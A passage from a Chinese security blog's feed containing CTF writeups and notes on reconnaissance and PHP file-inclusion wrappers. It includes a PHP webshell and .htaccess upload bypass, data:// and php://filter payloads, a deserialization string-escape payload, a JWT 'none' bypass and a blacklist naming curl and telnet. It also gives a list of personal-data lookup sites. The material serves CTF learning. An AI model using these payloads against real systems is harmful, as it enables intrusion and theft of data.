class="line">        c=encrypt(flag, a, si)</span><br><span class="line">        print(c[:<span class="number">8</span>] + <span class="string">&quot;--&gt;&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="built_in">str</span>(a) + <span class="string">&quot; &quot;</span>+ salt)</span><br><span class="line">        <span class="keyword">if</span> c[:<span class="number">8</span>] == <span class="string">&#x27;17740150&#x27;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">a = A</span><br><span class="line">salt = SALT</span><br><span class="line">si = cycle(salt.lower())</span><br><span class="line">decrypt(_flag, a , si)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><p>凑巧赶上了大佬的车拿到了flag，改动之后就不会了…<br>身为一名web手，结果一道web题都做不出来~</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
            <tag> BJDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="2020/05/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>2020/05/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>1.域名信息：<br>a,通过域名获取对应的IP，然后通过ping看一下这个IP这台服务器TTL返回的时间返回值  初步的判断这个用的是什么服务器什么版本，还可以输入ns lookup+域名来查看这个域名对应的IP地址<br>b.收集子域名<br>(1).site+域名<br>(2).使用工具layer子域名挖掘机4.2<br>(3).使用工具subDomainsBrute<br>子域名较好找漏洞<br>c.whois（注册人）信息查询：<br>(1).根据已知域名反查，分析出此域名的注册人、邮箱、电话等<br>(2).工具：爱站网、站长工具、微步在线(<a href="http://x.threatbook.cn/">http://x.threatbook.cn</a>)<br>(3).site.ip138.com、searchdns.netcraft.com<br>2.敏感目录：<br>a.收集方向：robots.txt、后台目录、安装包、上传目录、MySQL管理接口、安装页面、 phpinfo、编辑器、IIS短文件<br>b.常用工具：<br>字典爆破&gt;&gt;御剑、dirbuster、wwwscan、iis_shortname_scanner<br>蜘蛛爬行&gt;&gt;爬行菜刀、webrobot、burp<br>3.端口扫描：<br>21&gt;&gt;ftp 22&gt;&gt;ssh 23&gt;&gt;telnet 110&gt;&gt;pop3 1433&gt;&gt;sqlsever 3306&gt;&gt;mysql….<br>3389&gt;&gt;mstssc 8080&gt;&gt;tomcat/jboss 9090&gt;&gt;websphere等等<br>常用工具：nmap、ScanPort(可查看开放的端口)、ntscan(弱口令)、telnet(手工)<br>4.旁站C段<br>旁站：同服务器其它站点<br>C段：同一网段其他服务器<br>常用工具：web&gt;&gt;k8旁站、御剑1.5 (<a href="http://www.5kik.com/c/">http://www.5kik.com/c/</a>)<br>端口&gt;&gt;PortScan ( <a href="https://www.webscan.cc/">https://www.webscan.cc/</a>)<br>5.整站分析<br>服务器类型：服务器平台、版本等 Linux区分大小写(eg：输入phP看他是否返回PHP)<br>网站容器：搭建网站的服务组件（eg：iis、apache、nginx、tomcat等）（抓个包看响应包/报错）<br>脚本类型：ASP、PHP、JSP（彩票站点）、aspx等<br>数据库类型：access、sqlserver、mysql、oracle、postgresql、db2、sqlist等<br>在ID=数字 这后面加and1=1<br>CMS类型：dedecms、diguo、meterinfo、dz （通过readme.txt看安装信息）<br>WAF（web应用防护系统/网站应用级入侵防御系统）(Web Application Firewall)<br>site: ：指定站点<br>7.URL采集<br>8.后台查找<br>9.CDN绕过方法<br>CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。<br><a href="http://www.ip138.com/">http://www.ip138.com/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 社工查询网站</span><br><span class="line">————————————————</span><br><span class="line">shodan      https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br><span class="line"></span><br><span class="line">zoomeye   https:&#x2F;&#x2F;www.zoomeye.org&#x2F;</span><br><span class="line"></span><br><span class="line">censys      https:&#x2F;&#x2F;censys.io&#x2F;</span><br><span class="line"></span><br><span class="line">pipl            https:&#x2F;&#x2F;pipl.com&#x2F;</span><br><span class="line"></span><br><span class="line">reg007      https:&#x2F;&#x2F;www.reg007.com&#x2F;</span><br><span class="line"></span><br><span class="line">whois        https:&#x2F;&#x2F;www.whois.com&#x2F;</span><br><span class="line"></span><br><span class="line">dogpile     https:&#x2F;&#x2F;www.dogpile.com&#x2F;</span><br><span class="line"></span><br><span class="line">Yandex     https:&#x2F;&#x2F;yandex.com&#x2F;</span><br><span class="line"></span><br><span class="line">启信宝       https:&#x2F;&#x2F;www.qixin.com&#x2F;?from&#x3D;baidusem24</span><br><span class="line"></span><br><span class="line">天眼查       https:&#x2F;&#x2F;www.tianyancha.com&#x2F;</span><br><span class="line"></span><br><span class="line">爱查          http:&#x2F;&#x2F;www.2cha.com&#x2F;</span><br><span class="line"></span><br><span class="line">IMEIdb      http:&#x2F;&#x2F;www.imeidb.com&#x2F;</span><br><span class="line"></span><br><span class="line">基站定位    http:&#x2F;&#x2F;www.cellid.cn&#x2F;</span><br><span class="line"></span><br><span class="line">银行卡号归属地     http:&#x2F;&#x2F;cha.yinhangkadata.com&#x2F;</span><br><span class="line"></span><br><span class="line">友商发票查询        http:&#x2F;&#x2F;fapiao.youshang.com&#x2F;</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>miniLCTF 2020</title>
      <link href="2020/05/17/2020minilCTF/"/>
      <url>2020/05/17/2020minilCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-MiniGameHacking"><a href="#Misc-MiniGameHacking" class="headerlink" title="Misc-MiniGameHacking"></a>Misc-MiniGameHacking</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2650491112.png"></p><p><a href="https://github.com/SMU-harvey/Harvey"><strong>附件</strong></a></p><p>解题思路：<br>看函数名,结合游戏,肯定是要通关才能拿flag,然后就想法改boss血或者改boss不能攻击<br>这里我们使用反编译工具dnspy打开dll文件</p><h4 id="dnspy（提取码：d0vl）"><a href="#dnspy（提取码：d0vl）" class="headerlink" title="dnspy（提取码：d0vl）"></a><a href="https://pan.baidu.com/s/1DEtisrXFC8dvqegzGnM5sg"><strong>dnspy</strong></a>（提取码：d0vl）</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/441053936.png"></p><p>然后改这个Full函数（boss的血），如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2122847656.png"></p><p>保存之后打开游戏，只需按住z键站撸boss，打完14关即可</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1130642187.png"></p><blockquote><p>不过真正的勇士都是直接连过十四关</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> miniLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪协议</title>
      <link href="2020/05/15/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>2020/05/15/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文：<a href="https://www.cnblogs.com/cmt/p/14553189.html">https://www.cnblogs.com/cmt/p/14553189.html</a></p></blockquote><h2 id="一、伪协议种类"><a href="#一、伪协议种类" class="headerlink" title="一、伪协议种类"></a>一、伪协议种类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; 访问http(s）网址</span><br><span class="line">ftp:&#x2F;&#x2F; 访问ftp</span><br><span class="line">php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流</span><br><span class="line">zlib:&#x2F;&#x2F; 压缩流</span><br><span class="line">data:&#x2F;&#x2F; 数据</span><br><span class="line">rar:&#x2F;&#x2F; RAR压缩包</span><br><span class="line">ogg:&#x2F;&#x2F; 音频流</span><br></pre></td></tr></table></figure><h2 id="二、造成文件包含漏洞的函数"><a href="#二、造成文件包含漏洞的函数" class="headerlink" title="二、造成文件包含漏洞的函数"></a>二、造成文件包含漏洞的函数</h2><p>include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readline</p><h4 id="1-include函数"><a href="#1-include函数" class="headerlink" title="1.include函数"></a>1.include函数</h4><p>可以放在PHP脚本的任意位置，一般放在流程控制的处理部分中。当PHP脚本执行到include指定引入的文件时，才将它包含并尝试执行。这种方式可以把程序执行时的流程进行简单化。当第二次遇到相同文件时，PHP还是会重新解释一次，include相对于require的执行效率下降很多，同时在引入文件中包含用户自定义函数时，PHP在解释过程中会发生函数重复定义问题。include载入成功后，返回1，失败则返回false。</p><h4 id="2-require函数"><a href="#2-require函数" class="headerlink" title="2.require函数"></a>2.require函数</h4><p>require函数一般放在PHP脚本的最前面，PHP执行前就会先读入require指定引入的文件，包含并尝试执行引入的脚本文件。require的工作方式是提高PHP的执行效率，当它在同一个网页中解释过一次后，第二次便不会解释。但同样的，正因为它不会重复解释引入文件，所以当PHP中使用循环或条件语句来引入文件时，需要用到include。require载入成功返回1，失败无返回值。</p><h4 id="3-include-once和require-once函数"><a href="#3-include-once和require-once函数" class="headerlink" title="3.include_once和require_once函数"></a>3.include_once和require_once函数</h4><p>分别与require / include作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果导入过了，那么便不会再次重复引入其同样的内容。</p><h4 id="4-highlight-file函数"><a href="#4-highlight-file函数" class="headerlink" title="4.highlight_file函数"></a>4.highlight_file函数</h4><p>highlight_file() 函数对文件进行语法高亮显示。<br>语法：highlight_file(filename,return) —— filename：必需。要进行高亮处理的 PHP 文件的路径。return：可选。如果设置 true，则本函数返回高亮处理的代码。<br>该函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。如果 return 参数被设置为 true，那么该函数会返回被高亮处理的代码，而不是输出它们。否则，若成功，则返回 true，失败则返回 false。许多服务器被配置为对带有 phps 后缀的文件进行自动高亮处理。例如，在查看 example.phps 时，将显示该文件被语法高亮显示的源代码。要启用该功能，请把AddType application/x-httpd-php-source .phps添加到 httpd.conf。</p><h4 id="5-show-source函数"><a href="#5-show-source函数" class="headerlink" title="5.show_source函数"></a>5.show_source函数</h4><p>该函数是highlight_file函数的别名。</p><h4 id="6-file-get-contents函数"><a href="#6-file-get-contents函数" class="headerlink" title="6.file_get_contents函数"></a>6.file_get_contents函数</h4><p>file_get_contents() 函数把整个文件读入一个字符串中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1261059946.png"></p><h4 id="7-file函数"><a href="#7-file函数" class="headerlink" title="7.file函数"></a>7.file函数</h4><p>file() 函数把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4273189012.png"></p><h4 id="8-fopen函数"><a href="#8-fopen函数" class="headerlink" title="8.fopen函数"></a>8.fopen函数</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/263460922.png"></p><h4 id="9-readfile函数"><a href="#9-readfile函数" class="headerlink" title="9.readfile函数"></a>9.readfile函数</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1474575383.png"></p><h2 id="三、php伪协议"><a href="#三、php伪协议" class="headerlink" title="三、php伪协议"></a>三、php伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input,用于执行php代码，需要post请求提交数据。</span><br><span class="line">php:&#x2F;&#x2F;filter,用于读取源码，get提交参数。?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64&#x2F;resource&#x3D;xxx.php</span><br><span class="line">需要开启allow_url_fopen:php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory、php:&#x2F;&#x2F;temp</span><br><span class="line">不需要开启allow_url_fopen:php:&#x2F;&#x2F;filter</span><br><span class="line">在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input</span><br><span class="line">php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码</span><br><span class="line">php:&#x2F;&#x2F;input需要post请求提交数据</span><br></pre></td></tr></table></figure><p>php://filter可以get提交?a=php://filter/read=convert.base64-encode/resource=xxx.php</p><h2 id="四、data协议"><a href="#四、data协议" class="headerlink" title="四、data协议"></a>四、data协议</h2><p>用法：<br>data://text/plain,xxxx(要执行的php代码)<br>data://text/plain;base64,xxxx(base64编码后的数据)<br>例：<br>?page=data://text/plain,<br>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p><h2 id="五、file协议"><a href="#五、file协议" class="headerlink" title="五、file协议"></a>五、file协议</h2><p>用法：<br>file://[本地文件系统的绝对路径]</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯青龙组 2020</title>
      <link href="2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto-you-raise-me-up"><a href="#Crypto-you-raise-me-up" class="headerlink" title="Crypto_you raise me up"></a>Crypto_you raise me up</h2><p><a href="https://pan.baidu.com/s/16iCD8XuDzeqdxYC2KZy_og"><strong>附件</strong></a>（提取码：cvbl）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/196336223.png"></p><p>此题考察离散对数，c=m^flag%n<br>经大佬指点，去百度<a href="https://blog.csdn.net/hefenghhhh/article/details/88812174"><strong>bsgs</strong></a><br>看懂之后就可以写脚本了<br>先用sage求个值</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1802325346.png"></p><p>最终得到底下的X值<br>接着python运行一波就可以得到flag<br>附上python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">-*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">   x=<span class="number">56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</span></span><br><span class="line">y=long_to_bytes(x)</span><br><span class="line">print(y)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2945124590.png"></p><p>如果在kali中即可直接运行得flag，否则需要依靠<a href="https://pan.baidu.com/s/1bIiICAdaEEW-6IzQkXLiuw"><strong>sage</strong></a>（提取码：cbgy）</p><h2 id="Crypto-boom"><a href="#Crypto-boom" class="headerlink" title="Crypto_boom"></a>Crypto_boom</h2><p><a href="https://pan.baidu.com/s/1ZA_vid0tbtPkCUsGTE-4Ew"><strong>附件</strong></a>（提取码：cacg）</p><p>这题就是需要通关（一共三关），需要在IDA打开<br>第一关（md5）：在线解得：en5oy</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/524062950.png"></p><p>第二关：解得：x=74;y=68;z=31</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2893839265.png"></p><p>第三关：解得：x=89127561</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/538577641.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/375266408.png"></p><p>最后通关得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3783353063.png"></p><p>这里计算全是sage得到的，强烈推荐sage，还不错哦，链接就在前面<br>不过猛男都直接硬算≥ ≤</p><blockquote><p>记录一下第一次以加密选手出道</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2020</title>
      <link href="2020/05/05/2020De1CTF/"/>
      <url>2020/05/05/2020De1CTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Check-in"><a href="#Web-Check-in" class="headerlink" title="Web_Check in"></a>Web_Check in</h2><p>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!<br>当过滤内容ph,和&gt;<br>上传的php图片木马用短文件绕过,<br>&lt;?=system(‘ls’);<br>上传的.htaccess可以这样写<br>AddType application/x-httpd-p<br>hp .jpg<br>用.htaccess的’’换行符,进行换行<br>抛开此题的auto过滤也可以使用.user.ini方式</p><h2 id="Misc-大杂烩"><a href="#Misc-大杂烩" class="headerlink" title="Misc_大杂烩"></a>Misc_大杂烩</h2><p>分析流量包，过滤http(本题为图片，6张jpg，1张png)</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/855756509.png"></p><p>过滤出http的包之后，调一下排序方式，就会更清楚的看到那几个有图片的数据，然后逐个提取</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2214000637.png"></p><p>提取出的jpg图片都是无用的干扰信息。png图片里有一个链接</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1707100713.png"></p><p>然后访问链接，是一个word文件。下载下来，binwalk -e 文件名 进行分离。由于附件是在谷歌云盘，所以需要挂梯子下载</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4111015375.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1579435868.png"></p><p>分理出的文件夹打开会有一个zip的压缩包，拿出来爆破。或者在kali里面爆破也行。因为官方提示是6位数的密码，前两位是DE，并且说了这是个爆破题</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/766053067.png"></p><p>爆破得出密码：DE34Q1</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/362851059.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3617853187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3309077275.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/439026996.png"></p><h3 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h3><blockquote><p>1.这里的压缩包不要解压，解压出来flag的txt文件会消失<br>2.使用2345压缩工具flag也会消失</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/921677107.png"></p><p>最后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1951972321.png"></p><blockquote><p>这次比赛杂项题组中做出来的还有两道题(签到)，需要科学上网</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> De1CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF四月春季战 2020</title>
      <link href="2020/04/24/2020DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98/"/>
      <url>2020/04/24/2020DASCTF%E5%9B%9B%E6%9C%88%E6%98%A5%E5%AD%A3%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc-Blueshark"><a href="#Misc-Blueshark" class="headerlink" title="Misc-Blueshark"></a>Misc-Blueshark</h2><p>这题考察蓝牙协议<br>首先要了解一下OBEX这个协议<br><a href="https://baike.baidu.com/item/OBEX%E5%8D%8F%E8%AE%AE/15748372?fr=aladdin">https://baike.baidu.com/item/OBEX%E5%8D%8F%E8%AE%AE/15748372?fr=aladdin</a><br>接着用wireshark打开下载好的文件，开始表演：<br>来到第383行：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1362613773.png"></p><p>然后看见info what_you_want.7z知道应该是要把下载下来的pcapng解压<br>OBEX要在wireshark里面过滤<br>解压需要密码，再回过头看383行OBRX协议里面的内容<br>然后看见password_is_bluetooth pin.txt<br>就知道解压密码是pin.txt<br>然后再去流量里面找info为pin的<br>就会看见解压密码为141854</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/970665866.png"></p><p>最后就将其解压，打开文档获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2687703523.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3589340154.png"></p><h2 id="Web-unserialize"><a href="#Web-unserialize" class="headerlink" title="Web-unserialize"></a>Web-unserialize</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;   </span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">   public $c;</span><br><span class="line">   function __toString()&#123;</span><br><span class="line">   &#x2F;&#x2F;flag.php</span><br><span class="line">       echo file_get_contents($this-&gt;c);</span><br><span class="line">       return &#39;nice&#39;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">echo read(write(serialize($a)));</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">echo &#39;&lt;br&gt;&#39;.$b-&gt;password;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以猜测是格式化字符串漏洞<br>这里有个小问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . ‘*’ . chr(0), ‘\0\0\0’, $data);</span><br><span class="line">&#125;</span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(‘\0\0\0’, chr(0) . ‘*’ . chr(0), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>000转换位chr(0).*.chr(0)这里,会导致字符串逃逸<br>具体<a href="https://www.php.cn/php-weizijiaocheng-437066.html">点我</a><br>最后构造出以下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;c&quot;;s: 8:&quot;password&quot;;O: 1:&quot;B&quot;: 1:&#123;s: 1:&quot;b&quot;;O: 1:&quot;C&quot;: 1:&#123;s: 1:&quot;c&quot;;s: 8:&quot;flag.php&quot;;&#125;a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;c&quot;;s: 8:&quot;password&quot;;O: 1:&quot;B&quot;: 1:&#123;s: 1:&quot;b&quot;;O: 1:&quot;C&quot;: 1:&#123;s: 1:&quot;c&quot;;s: 8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虎符CTF 2020</title>
      <link href="2020/04/24/2020%E8%99%8E%E7%AC%A6CTF/"/>
      <url>2020/04/24/2020%E8%99%8E%E7%AC%A6CTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Easylogin"><a href="#Web-Easylogin" class="headerlink" title="Web-Easylogin"></a>Web-Easylogin</h2><h4 id="buuctf复现入口"><a href="#buuctf复现入口" class="headerlink" title="buuctf复现入口"></a><a href="https://buuoj.cn/challenges#[HFCTF2020]EasyLogin"><strong>buuctf复现入口</strong></a></h4><p>一看这个题就知道是用admin登陆，不信你就注册admin账号试试。（发现注册不了，就肯<br>定是用admin账号登陆拿flag）<br>1.话不多说先上图</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/378118769.png"></p><p>先注册看看，然后发现 token。那我们就把 token 里面的东西显示出来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1312150754.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/817220210.png"></p><p>发现加密是HS256。然后我看了大佬的wp（用none来绕过hs256,最后我会把<br>大佬的wp放出来。）再看secretid:1，把1变成[ ]（空数组即可绕过）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/447516078.png"></p><p>拿到 cookie 就完事。最后一步用原始的号去拿 flag，然后替换 cookie</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4254027831.png"></p><blockquote><p>参考赵师傅的wp：<a href="https://www.zhaoj.in/read-6512.html">https://www.zhaoj.in/read-6512.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虎符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I春秋练习题</title>
      <link href="2020/04/11/I%E6%98%A5%E7%A7%8B%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
      <url>2020/04/11/I%E6%98%A5%E7%A7%8B%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      
